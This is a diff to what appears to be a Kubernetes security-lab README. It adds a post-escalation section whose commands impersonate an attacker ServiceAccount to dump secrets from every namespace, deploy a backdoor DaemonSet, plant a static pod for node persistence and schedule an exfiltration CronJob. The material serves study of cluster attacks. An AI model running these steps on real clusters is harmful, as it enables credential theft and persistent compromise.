@@ -105,6 +105,51 @@ kubectl get secrets --all-namespaces --as=system:serviceaccount:default:attacker
 
 This returns secrets from every namespace, including `kube-system`, exposing service account tokens and other sensitive material.
 
+## Post-Escalation
+
+Once an attacker holds `cluster-admin`, the entire cluster is compromised. Below are the typical next steps — each shown as a single command impersonating the escalated ServiceAccount.
+
+### a) Harvest all secrets across every namespace
+
+```bash
+kubectl get secrets -A --as=system:serviceaccount:default:attacker-sa
+```
+
+This dumps service account tokens, TLS certificates, registry credentials, and application secrets from every namespace.
+
+### b) Deploy a backdoor DaemonSet
+
+A DaemonSet runs a pod on every node, giving the attacker persistent access even if individual pods are killed.
+
+```bash
+kubectl apply -f ../backdoor-container/backdoor-daemonset.yaml \
+  --as=system:serviceaccount:default:attacker-sa
+```
+
+See [Backdoor Container](../backdoor-container/README.md) for the full walkthrough.
+
+### c) Create a static pod for node-level persistence
+
+Static pods are managed by the kubelet directly and survive API-server-level cleanup.
+
+```bash
+# Requires node access (e.g., via a privileged pod or SSH)
+cp static-pod.yaml /etc/kubernetes/manifests/
+```
+
+See [Static Pods](../static-pods/README.md) for the full walkthrough.
+
+### d) Schedule a CronJob for periodic exfiltration
+
+A CronJob can silently exfiltrate secrets or cluster state on a schedule.
+
+```bash
+kubectl apply -f ../kubernetes-cronjob/exfil-cronjob.yaml \
+  --as=system:serviceaccount:default:attacker-sa
+```
+
+See [Kubernetes CronJob](../kubernetes-cronjob/README.md) for the full walkthrough.
+
 ## Cleanup
 
 ```bash
